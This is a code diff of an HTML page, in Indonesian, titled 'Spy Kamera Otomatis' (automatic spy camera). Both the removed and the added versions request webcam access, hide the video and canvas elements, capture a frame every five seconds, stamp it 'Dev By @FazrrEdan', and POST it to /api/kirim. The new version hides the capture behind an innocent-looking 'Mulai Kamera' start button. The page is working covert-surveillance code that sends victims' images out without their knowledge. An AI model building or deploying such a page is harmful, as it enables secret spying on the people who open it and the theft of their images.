@@ -1,53 +1,51 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Spy Kamera Otomatis</title>
-  </head>
-  <body>
-    <h2>Akses Kamera Diam-diam</h2>
-    <video id="video" autoplay playsinline width="320" height="240"></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+<head>
+  <title>Spy Kamera Otomatis</title>
+</head>
+<body>
+  <h2>Klik untuk mulai</h2>
+  <button id="startBtn">Mulai Kamera</button>
 
-    <script>
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const context = canvas.getContext("2d");
-      let spamInterval;
+  <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
-      // Mengakses kamera pengguna
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-          video.srcObject = stream;
+  <script>
+    const startBtn = document.getElementById("startBtn");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    let interval;
 
-          // Mulai mengambil foto setiap 5 detik
-          spamInterval = setInterval(() => {
-            // Menggambar video ke canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    startBtn.onclick = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        startBtn.style.display = "none";
 
-            // Menambahkan teks "Dev By @FazrrEdan" pada gambar
-            context.font = "20px Arial";  // Set font ukuran teks
-            context.fillStyle = "rgba(0, 0, 0, 0.7)";  // Set warna teks
-            context.fillText("Dev By @FazrrEdan", 10, 30);  // Posisi teks di atas gambar
+        // Setelah kamera aktif, mulai ambil foto tiap 5 detik
+        interval = setInterval(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          ctx.fillStyle = "rgba(0, 0, 0, 0.6)";
+          ctx.font = "16px Arial";
+          ctx.fillText("Dev By @FazrrEdan", 10, 20);
 
-            // Mengambil data gambar dengan teks
-            const imageData = canvas.toDataURL("image/jpeg");
+          const image = canvas.toDataURL("image/jpeg");
 
-            // Mengirim gambar ke server
-            fetch("/api/kirim", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ image: imageData }),
-            });
-          }, 5000); // ambil foto tiap 5 detik
-        })
-        .catch((err) => {
-          alert("Gagal akses kamera: " + err);
-        });
+          fetch("/api/kirim", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ image })
+          });
+        }, 5000);
+      } catch (err) {
+        alert("Gagal akses kamera: " + err.message);
+      }
+    };
 
-      // Hentikan spam foto jika pengguna keluar/menutup halaman
-      window.addEventListener("beforeunload", () => {
-        clearInterval(spamInterval);
-      });
-    </script>
-  </body>
+    window.addEventListener("beforeunload", () => {
+      clearInterval(interval);
+    });
+  </script>
+</body>
 </html>
